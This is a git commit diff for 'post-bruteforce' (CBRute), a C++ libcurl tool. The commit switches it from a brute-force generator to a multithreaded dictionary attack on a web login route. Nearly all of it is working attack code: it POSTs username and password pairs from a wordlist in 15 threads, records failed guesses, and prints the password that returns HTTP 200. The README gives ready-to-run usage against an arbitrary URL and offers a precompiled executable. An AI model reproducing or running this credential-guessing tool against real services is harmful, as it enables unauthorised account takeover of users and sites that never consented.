99dc7c0f24ca1b922eb744d59c2ae57d5f4b9be0
gemmyfellow <171301123+gemmyfellow@users.noreply.github.com>
2024-05-31 02:25:08 +0200

    Use dictionary attack
    - Use a dicitonary attack instead, with 10mil-dict.txt being the dictionary
    - added args for dictionary file
    - added some documentation in readme and changed example image

--- README.md
+++ README.md
@@ -1,16 +1,16 @@
 # post-bruteforce
 
-Create a simple brute force against a post route using CLI.
+Create a simple dictionary attack against a post route using CLI.
 
 
 ## How to use
 
-<img src="https://github.com/cobs0n/post-bruteforce/blob/main/sdawdawd.png"></img>
+<img src="/example.png"></img>
 
 You can install a precompiled version <a href="https://github.com/cobs0n/post-bruteforce/releases/tag/cbrute">here</a>, simply open commands prompts in the same directory as the exe and paste the command simillar to this, the first argument would be the username and the second argument would be the post route url. 
 
 ```
-CBRute.exe target https://example.com
+CBRute.exe target https://example.com dict.txt
 ```
 
 
@@ -18,6 +18,10 @@ CBRute.exe target https://example.com
 
 If you would like to build from source, you'd first need to have a c++ compiler and curl installed. <a href="https://stackoverflow.com/questions/53861300/how-do-you-properly-install-libcurl-for-use-in-visual-studio-2017">Heres </a> a tutorial on how you can install curl. Afterwards just download the cbrute.cpp and build.
 
+You can use make to build the project
+```
+make
+```
 
 # Donate
 
--- cbrute.cpp
+++ cbrute.cpp
@@ -1,15 +1,17 @@
-#include <iostream>
-#include <fstream>
-#include <string>
-#include <vector>
-#include <thread>
-#include <future>
-#include <chrono>
-#include <mutex>
-#include <random>
 #include <algorithm>
-#include <iterator>
+#include <chrono>
+#include <cstddef>
+#include <exception>
+#include <fstream>
+#include <functional>
+#include <ios>
+#include <iostream>
+#include <mutex>
+#include <ostream>
 #include <set>
+#include <string>
+#include <thread>
+#include <vector>
 #define CURL_STATICLIB
 #include <curl/curl.h>
 #include <stdexcept>
@@ -19,179 +21,236 @@ std::string found_pass = "";
 std::string target = "";
 std::string url = "";
 int i = 0;
-std::mutex file_mtx;
+std::mutex
+    dict_mtx; // mutex for fil containing the passwords for a dictionary attack
+std::mutex bad_pass_mtx;
 std::vector<std::string> passwords;
+std::set<std::string> bad_passwords_set;
+std::string dict_file_path;
 
-void write_line(const std::string& file_path, const std::string& line) {
-    std::lock_guard<std::mutex> guard(file_mtx);
-    
-    std::vector<std::string> encodings = { "utf-8", "latin-1", "iso-8859-1", "cp1252" };
+void write_line(const std::string &file_path, const std::string &line) {
 
-    for (const auto& encoding : encodings) {
-        try {
-            std::ofstream file(file_path, std::ios_base::app);
-            if (file.is_open()) {
-                file << line << std::endl;
-                break;
-            }
-        }
-        catch (const std::exception& e) {
-            std::cerr << "An error occurred: " << e.what() << std::endl;
-            break;
-        }
+  try {
+    std::ofstream file(file_path, std::ios_base::app);
+    if (file.is_open()) {
+      file << line << std::endl;
     }
+  } catch (const std::exception &e) {
+    std::cerr << "An error occurred: " << e.what() << std::endl;
+  }
 }
 
-std::vector<std::string> read_file(const std::string& file_path) {
-    std::vector<std::string> lines;
-    std::vector<std::string> encodings = { "utf-8", "latin-1", "iso-8859-1", "cp1252" };
+std::vector<std::string> read_file(const std::string &file_path) {
+  std::vector<std::string> lines;
+  std::vector<std::string> encodings = {"utf-8", "latin-1", "iso-8859-1",
+                                        "cp1252"};
 
-    for (const auto& encoding : encodings) {
-        try {
-            std::ifstream file(file_path);
-            if (file.is_open()) {
-                std::string line;
-                while (std::getline(file, line)) {
-                    lines.push_back(line);
-                }
-                file.close();
-                return lines;
-            }
+  for (const auto &encoding : encodings) {
+    try {
+      std::ifstream file(file_path);
+      if (file.is_open()) {
+        std::string line;
+        while (std::getline(file, line)) {
+          lines.push_back(line);
         }
-        catch (const std::exception& e) {
-            std::cerr << "An error occurred: " << e.what() << std::endl;
-            return {};
-        }
+        file.close();
+        return lines;
+      }
+    } catch (const std::exception &e) {
+      std::cerr << "An error occurred: " << e.what() << std::endl;
+      return {};
     }
-    return {};
+  }
+  return {};
+}
+
+std::string read_file_line(std::ifstream &file) {
+  std::string line;
+
+  try {
+    if (file.is_open()) {
+      std::getline(file, line);
+      return line;
+    }
+  } catch (const std::exception &e) {
+    std::cerr << "An error occurred: " << e.what() << std::endl;
+  }
+  return "";
 }
 
 std::string generate_password() {
-    std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
-    std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/";
+  std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY"
+                           "Z0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/";
 
-    for (int password_length = 1; password_length <= 21; ++password_length) {
-        for (char ch : characters) {
-            std::string password_attempt(password_length, ch);
+  // i'd start at 6 characters to not waste time
+  for (int password_length = 6; password_length <= 21; ++password_length) {
+    for (char ch : characters) {
+      std::string password_attempt(password_length, ch);
 
-            if (std::find(bad_passwords.begin(), bad_passwords.end(), password_attempt) == bad_passwords.end() &&
-                std::find(passwords.begin(), passwords.end(), password_attempt) == passwords.end()) {
-                return password_attempt;
-            }
-        }
+      if (std::find(bad_passwords_set.begin(), bad_passwords_set.end(),
+                    password_attempt) == bad_passwords_set.end() &&
+          std::find(passwords.begin(), passwords.end(), password_attempt) ==
+              passwords.end()) {
+        return password_attempt;
+      }
     }
-    return "";
+  }
+  return "";
 }
 
-size_t discard_data_callback(void* ptr, size_t size, size_t nmemb, void* userdata) {
-    return size * nmemb;
+std::string get_dict_password(std::ifstream &dict_file) {
+  std::string password = read_file_line(dict_file);
+  // if password is in the passwords already used, then give empty string
+  return bad_passwords_set.find(password) != bad_passwords_set.end() ? ""
+                                                                     : password;
 }
 
-void advanced_cracking() {
-    CURL* curl;
-    CURLcode res;
-    try {
-        curl = curl_easy_init();
-        if (curl) {
-            std::string user = target;
-            std::string password = generate_password();
-            passwords.push_back(password);
-            std::string data = "user=" + user + "&pass=" + password;
+size_t discard_data_callback(void *ptr, size_t size, size_t nmemb,
+                             void *userdata) {
+  return size * nmemb;
+}
 
-            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
+void record_failed_attempt(std::string &password) {
+  std::lock_guard<std::mutex> guard(bad_pass_mtx);
+  write_line("bad_passwords.txt", password);
+  bad_passwords_set.insert(password);
+  passwords.erase(std::remove(passwords.begin(), passwords.end(), password),
+                  passwords.end());
+}
 
-            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data_callback);
+void advanced_cracking(std::ifstream &file) {
+  CURL *curl;
+  CURLcode res;
+  try {
+    curl = curl_easy_init();
+    if (curl) {
+      std::string user = target;
+      std::string password = get_dict_password(file);
+      if (password.empty()) {
+        // no password means it is an attempt already done
+        return;
+      }
+      passwords.push_back(password);
+      std::string data = "user=" + user + "&pass=" + password;
 
-            res = curl_easy_perform(curl);
+      curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
 
-            if (res != CURLE_OK) {
-                throw std::runtime_error(curl_easy_strerror(res));
-            }
+      curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data_callback);
 
-            long http_code = 0;
-            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
+      res = curl_easy_perform(curl);
 
-            if (http_code == 200) {
-                found_pass = password;
-                found = true;
-            }
-            else if (http_code == 401) {
-                write_line("bad_passwords.txt", password);
-                passwords.erase(std::remove(passwords.begin(), passwords.end(), password), passwords.end());
-            }
-            else if (http_code == 400) {
-                passwords.erase(std::remove(passwords.begin(), passwords.end(), password), passwords.end());
+      if (res != CURLE_OK) {
+        throw std::runtime_error(curl_easy_strerror(res));
+      }
 
-            }
-            else {
-                passwords.erase(std::remove(passwords.begin(), passwords.end(), password), passwords.end());
-            }
+      long http_code = 0;
+      curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
 
-            i += 1;
-            curl_easy_cleanup(curl);
-        }
-        else {
-            throw std::runtime_error("Failed to initialize CURL");
-        }
+      if (http_code == 200) {
+        // success
+        found_pass = password;
+        found = true;
+      } else {
+        // record failed attempt
+        record_failed_attempt(password);
+      }
+
+      i++;
+
+      curl_easy_cleanup(curl);
+    } else {
+      throw std::runtime_error("Failed to initialize CURL");
     }
-    catch (const std::exception& e) {
-        // std::cerr << e.what() << std::endl;
-    }
+  } catch (const std::exception &e) {
+    // std::cerr << e.what() << std::endl;
+  }
 }
 
 void status_report() {
-    auto start_time = std::chrono::high_resolution_clock::now();
-    while (!found) {
-        std::this_thread::sleep_for(std::chrono::seconds(1)); 
+  auto start_time = std::chrono::high_resolution_clock::now();
+  while (!found) {
+    std::this_thread::sleep_for(std::chrono::seconds(1));
 
-        std::lock_guard<std::mutex> lock(file_mtx);
-        if (i % 1000 == 0 && i != 0) {
-            auto elapsed_time = std::chrono::high_resolution_clock::now() - start_time;
-            double elapsed_seconds = std::chrono::duration_cast<std::chrono::seconds>(elapsed_time).count();
-            std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
-            std::cout << "Tried " << i << " attempts \nTotal " << bad_passwords.size() << " combinations.\n";
-            std::cout << "Time taken for last 1000 iterations: " << elapsed_seconds << " seconds" << std::endl;
-            start_time = std::chrono::high_resolution_clock::now(); // Reset the start time
-        }
+    std::lock_guard<std::mutex> lock(bad_pass_mtx);
+    if (i % 1000 == 0 && i != 0) {
+      auto elapsed_time =
+          std::chrono::high_resolution_clock::now() - start_time;
+      double elapsed_seconds =
+          std::chrono::duration_cast<std::chrono::seconds>(elapsed_time)
+              .count();
+      std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
+      std::cout << "Tried " << i << " attempts \nTotal " << bad_passwords.size()
+                << " combinations.\n";
+      std::cout << "Time taken for last 1000 iterations: " << elapsed_seconds
+                << " seconds" << std::endl;
+      start_time =
+          std::chrono::high_resolution_clock::now(); // Reset the start time
     }
-
+  }
 }
 
-void brute_force(){
-
-    while (!found){
-        for (int i = 0; i < 10000; ++i) {
-            if (found)
-                break;
-            advanced_cracking();
-        }
-    }
+void brute_force(std::ifstream const & file) {
+  // change to modifiable ifstream
+  std::ifstream& dict_file = const_cast<std::ifstream&>(file);
+  while (!found && !dict_file.eof() ) {
+      advanced_cracking(dict_file);
+  }
 }
 
-int main(int argc, char* argv[]) {
-    std::thread status_thread(status_report);
-    status_thread.detach();
-    if (argv[1]) {
-        target = argv[1];
-    } else {
-        std::cout << "you must input a target";
-        return 0;
-    }
-    if (argv[2]) {
-        url = argv[2];
-    } else {
-        std::cout << "you must input a url";
-        return 0;
-    }
-    std::cout << "Initiating bruteforce against " << target << " on " << url << "\n";
-    for (int i =0 ; i< 15; i++){
-        std::thread t(brute_force);
+int main(int argc, char *argv[]) {
+  std::thread status_thread(status_report);
+  status_thread.detach();
+
+  if (argc >= 2 && argv[1]) {
+    target = argv[1];
+  } else {
+    std::cout << "you must input a target" << std::endl;
+    return 1;
+  }
+
+  if (argc >= 3 && argv[2]) {
+    url = argv[2];
+  } else {
+    std::cout << "you must input a url" << std::endl;
+    return 1;
+  }
+
+  // 3rd arg is path to dictionary
+  if (argc >= 4 &&  argv[3]) {
+    dict_file_path = argv[3];
+    
+
+  } else{
+
+    std::cout << "you must input a path to the dictionary file." << std::endl;
+    return 1;
+  }
+
+  // get a hashset of bad passwords
+  std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
+  bad_passwords_set = std::set(bad_passwords.begin(), bad_passwords.end());
+
+  try {
+      // get the inputstream for file
+      std::ifstream dict_file(dict_file_path, std::ios_base::in);
+      std::cout << "Initiating bruteforce against " << target << " on " << url
+                << "\n";
+      for (int i = 0; i < 15; i++) {
+        std::thread t(brute_force, std::ref(dict_file));
         t.detach();
+      }
+      while (!found) {
+      }
+      dict_file.close();
+    } catch (std::ifstream::failure &e) {
+      // handle  file exception
+      std::cout << "error opening dictionary file.\n" << std::endl;
+      return 1;
     }
-    while (!found){}
-    std::cout << found_pass;
-    std::cout << found << std::endl;
 
-    return 0;
+  std::cout << found_pass;
+  std::cout << found << std::endl;
+
+  return 0;
 }
